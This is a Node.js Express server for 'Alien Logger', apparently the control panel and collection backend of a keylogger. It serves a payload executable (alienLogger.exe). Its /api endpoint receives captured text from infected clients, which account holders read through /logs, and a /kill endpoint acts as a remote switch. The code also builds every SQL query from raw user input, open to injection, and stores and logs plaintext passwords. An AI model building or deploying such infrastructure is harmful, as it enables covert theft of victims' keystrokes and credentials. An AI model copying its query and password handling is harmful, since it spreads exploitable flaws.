// ▄▄▄· ▄▄▌  ▪  ▄▄▄ . ▐ ▄     ▄▄▌         ▄▄ •  ▄▄ • ▄▄▄ .▄▄▄
//▐█ ▀█ ██•  ██ ▀▄.▀·•█▌▐█    ██•  ▪     ▐█ ▀ ▪▐█ ▀ ▪▀▄.▀·▀▄ █·
//▄█▀▀█ ██▪  ▐█·▐▀▀▪▄▐█▐▐▌    ██▪   ▄█▀▄ ▄█ ▀█▄▄█ ▀█▄▐▀▀▪▄▐▀▀▄
//▐█ ▪▐▌▐█▌▐▌▐█▌▐█▄▄▌██▐█▌    ▐█▌▐▌▐█▌.▐▌▐█▄▪▐█▐█▄▪▐█▐█▄▄▌▐█•█▌
// ▀  ▀ .▀▀▀ ▀▀▀ ▀▀▀ ▀▀ █▪    .▀▀▀  ▀█▄▀▪·▀▀▀▀ ·▀▀▀▀  ▀▀▀ .▀  ▀
// https://xn--rihy934p.ws

const fs = require('fs');
const mysql = require('mysql');
const mysqldump = require('mysqldump');
const http = require('http');
const https = require('https');
const request = require('request');
const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const cloudflare = require('cloudflare-express');
const ipfilter = require('ipfilter');
const path = require('path');
const moment = require('moment');
const bcrypt = require('bcrypt');
const uuid = require('uuid/v1');
const figlet = require('figlet');
const chalk = require('chalk');
const cli_table = require('cli-table3');
const clear = require('clear');
const crypto = require('crypto');
const cron = require('node-cron');

const config = require('./config.json');

const app = express();

const connection = mysql.createConnection(config.database);

connection.on('error', (err) => {
  if(err.code === 'PROTOCOL_CONNECTION_LOST') {
		logger('Lost database connection');
		setInterval(() => {process.exit()}, 100);
  } else {
		logger('Database error');
	  setInterval(() => {process.exit()}, 100);
	}
});

cron.schedule('0 0 * * *', () => {
  filename = `./db-backups/backup-${moment().format('YYYY-MM-DD')}.sql`
  mysqldump({
    connection: config.database,
    dump: {
      data: {
        format : false
      }
    },
    dumpToFile: filename,
  });
  logger(`Database backup => ${filename}`);
});

function logger(input) {
	output = `${moment().format('YYYY-MM-DD HH:mm:ss Z')} | ${input}\n`;
	fs.appendFile('./log.txt', output, (err) => {
	    if (err) console.log(err);
	});
}

function encrypt_aes_256(string, password) {
  let cipher = crypto.createCipher('aes-256-ctr', password);
  let crypted = cipher.update(string, 'utf8', 'hex');
  crypted += cipher.final('hex');
  return crypted;
}

function decrypt_aes_256(string, password) {
  let decipher = crypto.createDecipher('aes-256-ctr', password);
  let dec = decipher.update(string, 'hex', 'utf8');
  dec += decipher.final('utf8');
  return dec;
}

function validate_username(username) {
  if(username.length > 50 || username.length < 5) return false;
  let regx = /^[a-zA-Z0-9]*$/;
  return regx.test(username);
}

function validate_password(password) {
  let regx = /(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,50}/;
  return regx.test(password);
}

function validate_email(email) {
  let regx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return regx.test(email);
}

app.set('view engine', 'pug');

let ips = config.blacklist;
app.use(ipfilter(ips));

app.use(session({
	secret: uuid(),
	resave: true,
	saveUninitialized: true
}));

app.use(cloudflare.restore({update_on_start: true}));

app.use(bodyParser.json({limit: '500mb'}));
app.use(bodyParser.urlencoded({limit: '500mb', extended: true, parameterLimit: 1000000}));

app.get('/', (req, res) => {
	if (req.session.loggedin) {
		res.redirect('/home');
	} else {
		res.render('index');
	}
});

app.get('/login', (req, res) => {
	if (req.session.loggedin) {
		res.redirect('/home');
	} else {
		res.render('login', {sitekey: config.recaptcha.site_key});
	}
});

app.get('/register', (req, res) => {
	if (req.session.loggedin) {
		res.redirect('/home');
	} else {
		res.render('register', {sitekey: config.recaptcha.site_key});
	}
});

app.get('/logout', (req, res) => {
	let user = req.session.username;
	logger(`${req.cf_ip} | ${user} logged out`);
	req.session.destroy();
	res.redirect('/home');
});

app.get('/home', (req, res) => {
	if (req.session.loggedin) {
    connection.query(`SELECT * FROM accounts WHERE username = '${req.session.username}'`, (error, results, fields) => {
      if (results.length > 0) {
				res.render('home', {username: `Welcome back, ${req.session.username}`, api_key: req.session.api_key, last_client_ip: results[0].last_client_ip, last_client_login: results[0].last_client_login, log_size: Math.round(Buffer.from(results[0].log).length / 1024) + 'kb'});
			} else {
				res.render('alert', {title: 'Database Error', message: 'Could not fetch data'});
			}
    });
  } else {
		res.redirect('/login');
	}
});

app.get('/account', (req, res) => {
	if (req.session.loggedin) {
		connection.query(`SELECT * FROM accounts WHERE username = '${req.session.username}'`, (error, results, fields) => {
			if (results.length > 0) {
				res.render('account', {username: results[0].username, email: results[0].email, password: req.session.password});
			} else {
				res.render('alert', {title: 'Database Error', message: 'Could not fetch data'});
			}
		});
	} else {
		res.redirect('/home');
	}
});

app.get('/payload', (req, res) => {
		res.setHeader('Content-disposition', 'attachment; filename=alienLogger.exe');
		res.setHeader('Content-type', 'application/x-msdownload');
		let file = fs.createReadStream('dl-content/payload.exe');
		file.pipe(res);
});

app.get('/about', (req, res) => {
	if (req.session.loggedin) {
		res.render('about');
	} else {
		res.redirect('/login');
	}
});

app.get('/discord', (req, res) => {
  res.redirect(config.discordInvite);
});

app.get('/instructions', (req, res) => {
	if (req.session.loggedin) {
		res.render('instructions');
	} else {
		res.redirect('/login');
	}
});

app.get('/kill', (req, res) => {
  if (config.kill == 'True') {
    res.send('True');
  } else {
    res.send('False');
  }
});

app.get('/banner', (req, res) => {
  res.sendFile(path.join(__dirname + '/img/banners/banner' + Math.floor(Math.random() * 4) + '.jpg'));
});

app.get('/icon', (req, res) => {
  res.sendFile(path.join(__dirname + '/img/icons/' + Math.floor(Math.random() * 2) + '.jpg'));
});

app.get('/img', (req, res) => {
  let num = req.query.num;
  if (num && num <= 6) {
    res.sendFile(path.join(__dirname + '/img/pic' + req.query.num + '.png'));
  } else {
    res.send('No image specified or out of range');
  }
});

app.get('/robots.txt', (req, res) => {
  res.sendFile(path.join(__dirname + '/robots.txt'));
});

app.get('/sitemap.xml', (req, res) => {
  res.sendFile(path.join(__dirname + '/sitemap.xml'));
});

app.get('*', (req, res) => {
  res.render('alert', {title: 'Error 404', message: 'Page could not be found'});
});

app.post('/login', (req, res) => {
	let username = req.body.username;
	let password = req.body.password;
  if (req.body['g-recaptcha-response'] === undefined || req.body['g-recaptcha-response'] === '' || req.body['g-recaptcha-response'] === null) {
    res.render('alert', {title: 'Recaptcha not verified', message: 'Please complete the recaptcha verification'});
  } else {
    let secretKey = config.recaptcha.secret_key;
    let verificationURL = `https://www.google.com/recaptcha/api/siteverify?secret=${secretKey}&response=${req.body['g-recaptcha-response']}&remoteip=${req.connection.remoteAddress}`;
    request(verificationURL, (err, resp, body) => {
      body = JSON.parse(body);
      if (body.success !== undefined && !body.success) {
        res.render('alert', {title: 'Recaptcha not verified', message: 'Please complete the recaptcha verification'});
        logger(`${req.cf_ip} | Failed recaptcha | ${username}:${password}`);
      } else {
        if (username && password) {
      		connection.query(`SELECT * FROM accounts WHERE username = '${username}'`, (error, results, fields) => {
      			if (results.length > 0) {
              if (bcrypt.compareSync(password, results[0].password)) {
        				req.session.loggedin = true;
        				req.session.username = username;
                req.session.password = password;
        				req.session.api_key = results[0].api_key;
        				res.redirect('/home');
        				connection.query(`UPDATE accounts SET last_ip = '${req.cf_ip}', last_login = '${moment().format('YYYY-MM-DD HH:mm:ss Z')}' WHERE username = '${username}'`, (error, results, fields) => {});
        				logger(`${req.cf_ip} | ${username} logged in`);
              } else {
        				res.render('alert', {title: 'Password Error', message: 'Incorrect password'});
        				logger(`${req.cf_ip} | Failed login | ${username}:${password}`);
        			}
      			} else {
              connection.query(`SELECT * FROM accounts WHERE email = '${username}'`, (error, results, fields) => {
          			if (results.length > 0) {
                  if (bcrypt.compareSync(password, results[0].password)) {
            				req.session.loggedin = true;
            				req.session.username = results[0].username;
                    req.session.password = password;
            				req.session.api_key = results[0].api_key;
            				res.redirect('/home');
            				connection.query(`UPDATE accounts SET last_ip = '${req.cf_ip}', last_login = '${moment().format('YYYY-MM-DD HH:mm:ss Z')}' WHERE username = '${results[0].username}'`, (error, results, fields) => {});
            				logger(`${req.cf_ip} | ${results[0].username} logged in`);
                  } else {
            				res.render('alert', {title: 'Password Error', message: 'Incorrect password'});
            				logger(`${req.cf_ip} | Failed login | ${username}:${password}`);
            			}
                } else {
                  res.render('alert', {title: 'Username Error', message: 'User does not exist'});
                  logger(`${req.cf_ip} | Failed login | ${username}:${password}`);
                }
              });
      			}
      		});
      	} else {
      		res.render('alert', {title: 'Input Error', message: 'Empty username or password'});
      	}
      }
    });
  }
});

app.post('/register', (req, res) => {
	let username = req.body.username;
	let emailaddress = req.body.emailaddress;
	let password = req.body.password;
  let confirm = req.body.confirm;
  if (req.body['g-recaptcha-response'] === undefined || req.body['g-recaptcha-response'] === '' || req.body['g-recaptcha-response'] === null) {
    res.render('alert', {title: 'Recaptcha not verified', message: 'Please complete the recaptcha verification'});
  } else {
    let secretKey = config.recaptcha.secret_key;
    let verificationURL = `https://www.google.com/recaptcha/api/siteverify?secret=${secretKey}&response=${req.body['g-recaptcha-response']}&remoteip=${req.connection.remoteAddress}`;
    request(verificationURL, (err, resp, body) => {
      body = JSON.parse(body);
      if (body.success !== undefined && !body.success) {
        res.render('alert', {title: 'Recaptcha not verified', message: 'Please complete the recaptcha verification'});
        logger(`${req.cf_ip} | Failed recaptcha | ${username}:${password}`);
      } else {
        if (username && password && emailaddress && confirm) {
          if (password === confirm) {
            if (validate_username(username)) {
              if (validate_password(password)) {
                if (validate_email(emailaddress)) {
                  connection.query(`SELECT * FROM accounts WHERE username = '${username}' OR email = '${emailaddress}'`, (error, results, fields) => {
                    if (results.length > 0) {
              				res.render('alert', {title: 'Username Error', message: 'This username or email is taken'});
              			} else {
              				let api_key = uuid();
              				connection.query(`INSERT INTO accounts(date_created, last_login, last_ip, last_client_login, last_client_ip, api_key, username, password, email, log) VALUES ('${moment().format('YYYY-MM-DD HH:mm:ss Z')}', 'Not logged in yet', '${req.cf_ip}', 'Not connected yet', 'Not connected yet', '${api_key}','${username}','${bcrypt.hashSync(password, 10)}','${emailaddress}','${encrypt_aes_256('No logs yet', api_key)}')`, (error, results, fields) => {
              					res.render('alert', {title: 'Sucessfuly Registered', message: 'You can now login'});
              					logger(`${req.cf_ip} | ${username} registered | api_key:${api_key}`);
              				});
              			}
              		});
                } else {
                  res.render('alert', {title: 'Validation Error', message: 'Invalid email'});
                }
              } else {
                res.render('alert', {title: 'Validation Error', message: 'Password must contain at least one digit/lowercase/uppercase letter and be at least 8 characters long'});
              }
            } else {
              res.render('alert', {title: 'Validation Error', message: "Username must be 5-50 letters long and can't contain non-English or special characters"});
            }
          } else {
            res.render('alert', {title: 'Password Error', message: "Passwords don't match"});
          }
      	} else {
      		res.render('alert', {title: 'Input Error', message: 'Empty username or password'});
      	}
    }
  });
  }
});

app.post('/account', (req, res) => {
	if (req.session.loggedin) {
		let username = req.body.username;
		let emailaddress = req.body.emailaddress;
		let old_password = req.body.oldPassword;
		let new_password = req.body.newPassword;
    if (username && emailaddress && old_password && new_password) {
      if (validate_username(username)) {
        if (validate_password(new_password)) {
          if (validate_email(emailaddress)) {
            connection.query(`SELECT * FROM accounts WHERE username = '${req.session.username}'`, (error, results, fields) => {
              if (results.length > 0) {
                if (bcrypt.compareSync(old_password, results[0].password)) {
                  connection.query(`UPDATE accounts SET username = '${username}', email = '${emailaddress}', password = '${bcrypt.hashSync(new_password, 10)}' WHERE username = '${req.session.username}'`, (error, results, fields) => {
                    if (results.affectedRows === 1) {
                      logger(`${req.cf_ip} | ${username} edited account`);
                      res.redirect('/logout');
                    } else {
                      res.render('alert', {title: 'Database Error', message: 'Account could not be edited'});
                    }
                  });
                } else {
                  res.render('alert', {title: 'Password Error', message: 'Incorrect password'});
                }
              } else {
                res.render('alert', {title: 'Database Error', message: 'Could not fetch data'});
              }
            });
          } else {
            res.render('alert', {title: 'Validation Error', message: 'Invalid email'});
          }
        } else {
          res.render('alert', {title: 'Validation Error', message: 'Password must contain at least one digit/lowercase/uppercase letter and be at least 8 characters long'});
        }
      } else {
        res.render('alert', {title: 'Validation Error', message: "Username must be 5-50 letters long and can't contain non-English or special characters"});
      }
    } else {
      res.render('alert', {title: 'Password Error', message: "You can't leave any fields empty"});
    }
	} else {
		res.redirect('/home');
	}
});

app.post('/delete', (req, res) => {
	if (req.session.loggedin) {
    connection.query(`SELECT * FROM accounts WHERE username = '${req.session.username}'`, (error, results, fields) => {
      if (results.length > 0) {
        if (bcrypt.compareSync(req.body.password, results[0].password)) {
          connection.query(`DELETE FROM accounts WHERE username='${req.session.username}'`, (error, results, fields) => {
            if (results.affectedRows === 1) {
              logger(`${req.cf_ip} | ${req.session.username} deleted account`);
              res.redirect('/logout');
            } else {
              res.render('alert', {title: 'Database Error', message: 'Account could not be deleted'});
            }
          });
        } else {
          res.render('alert', {title: 'Password Error', message: 'Incorrect password'});
        }
      } else {
        res.render('alert', {title: 'Database Error', message: 'Could not fetch data'});
      }
    });
	} else {
		res.redirect('/home');
	}
});

app.post('/logs', (req, res) => {
	if (req.session.loggedin) {
		connection.query(`SELECT CONVERT(log USING utf8) FROM accounts WHERE username = '${req.session.username}'`, (error, results, fields) => {
      if (results.length > 0) {
        let text = (results[0]['CONVERT(log USING utf8)']);
        dec = decrypt_aes_256(text, req.session.api_key);
			  res.render('logs', {logs: dec});
			  logger(`${req.cf_ip} | ${req.session.username} requested logs`);
      } else {
        res.render('alert', {title: 'Database Error', message: 'Could not fetch data'});
      }
		});
	} else {
		res.redirect('/home');
	}
});

app.post('/keycheck', (req, res) => {
	if (req.query.key) {
		connection.query(`SELECT * FROM accounts WHERE api_key = '${req.query.key}'`, (error, results, fields) => {
			if (results.length > 0) {
				res.sendStatus(200);
			} else {
				res.sendStatus(403);
			}
		});
	} else {
		res.send('No api key provided');
	}
});

app.post('/api', (req, res) => {
		if (req.query.key) {
			connection.query(`SELECT * FROM accounts WHERE api_key = '${req.query.key}'`, (error, results, fields) => {
				if (results.length > 0) {
					let {text} = req.body;
			    text = text.join().replace(/,/g, '');
          crypted = encrypt_aes_256(text, req.query.key);
					connection.query(`UPDATE accounts SET last_client_login='${moment().format('YYYY-MM-DD HH:mm:ss Z')}', last_client_ip='${req.cf_ip}', log='${crypted}' WHERE api_key='${req.query.key}'`, (error, results, fields) => {
						if (error) {
							console.log(error);
							res.send('Database error' + error);
						} else {
							res.send('File uploaded successfuly');
							logger(`${req.cf_ip} | Successful file upload from client: ${req.query.key}`);
						}
					});
				} else {
					res.send('Incorrect api key');
					logger(`${req.cf_ip} | Failed file upload from client: ${req.query.key}`);
				}
			});
		} else {
			res.send('No api key provided');
		}
});

function showInfo(db_input) {
  figlet('Alien Logger', {font: 'Elite'}, (error, data) => {
    clear();
    let table = new cli_table({
      chars: { 'top': '═' , 'top-mid': '╤' , 'top-left': '╔' , 'top-right': '╗'
             , 'bottom': '═' , 'bottom-mid': '╧' , 'bottom-left': '╚' , 'bottom-right': '╝'
             , 'left': '║' , 'left-mid': '╟' , 'mid': '─' , 'mid-mid': '┼'
             , 'right': '║' , 'right-mid': '╢' , 'middle': '│' }
    });
    table.push(
      [{colSpan: 2, content: data}],
      [{colSpan: 2, content: chalk.yellow('Info')}],
      ['Version', config.version],
      ['NodeJS', process.version],
      ['Author', config.author],
      ['URL', config.url],
      ['Port', config.port],
      ['SSL Port', config.securePort],
      ['Registered users', db_input.length],
      [{colSpan: 2, content: chalk.yellow('Routes')}]
    );
    app._router.stack.forEach((item) => {
      if (item.route) {
        let method;
        if (item.route.methods.post) {
          method = chalk.cyan('POST');
        } else {
          method = chalk.green('GET');
        }
        table.push([method, item.route.path]);
      }
    });
    console.log(table.toString());
  });
}

connection.query(`SELECT * FROM accounts`, (error, results, fields) => {
  if (error) {
    logger('Could not connect to database');
    setInterval(() => {process.exit()}, 100);
  } else {
    showInfo(results);
    logger('Alien Logger Started');
  }
});

http.createServer(app).listen(config.port, '0.0.0.0');
/*https.createServer({
  key: fs.readFileSync('./certs/server.key'),
  cert: fs.readFileSync('./certs/server.cert')
}, app).listen(config.securePort, '0.0.0.0');*/
